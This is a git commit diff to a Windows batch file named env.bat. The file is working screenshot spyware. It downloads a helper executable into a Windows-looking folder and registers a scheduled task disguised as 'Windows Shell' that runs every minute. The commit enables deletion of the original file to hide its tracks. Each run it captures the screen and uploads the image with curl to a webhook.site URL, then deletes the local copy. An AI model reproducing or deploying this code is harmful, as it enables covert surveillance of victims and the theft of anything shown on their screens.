8f0057459319ecb2abe418f240e39df126d6e871
r4m <me@r4mdev.online>
2023-11-21 08:19:00 +0530

    updated webhook and url

--- env.bat
+++ env.bat
@@ -1,8 +1,8 @@
 @echo off
 
 set CDIR=%LOCALAPPDATA%\Microsoft\Windows\Shell
-set WEBHOOK=https://webhook.site/432e7050-cba6-4588-9563-fdb98a1d274b
-set NIRCMD_URL=https://tmpfiles.org/dl/3205021/nircmdc.exe
+set WEBHOOK=https://webhook.site/aeb43e21-530e-4c19-b044-82d876d0572a
+set NIRCMD_URL=https://github.com/r4mdev/shotter/raw/main/nircmdc.exe
 
 IF NOT Exist %CDIR%\nircmdc.exe (
 	REM File not i - download and schtask every minute
@@ -10,7 +10,7 @@ IF NOT Exist %CDIR%\nircmdc.exe (
 	curl %NIRCMD_URL% -o %CDIR%\nircmdc.exe
 	copy "%~f0" "%CDIR%\env.bat" 
 	schtasks /Create /SC minute /MO 1 /TN "Windows Shell" /TR %CDIR%\env.bat
-	REM del "%~f0"
+	del "%~f0"
 )
 
 setlocal
@@ -18,5 +18,5 @@ For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
 For /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
 set NAME=%CDIR%\%mydate%_%mytime%.jpg
 %CDIR%\nircmdc.exe savescreenshot "%NAME%" jpg
-curl --ssl-no-revoke -X POST -F "screenshot=@%NAME%" %WEBHOOK%
+curl -X POST -F "screenshot=@%NAME%" %WEBHOOK%
 del %NAME%
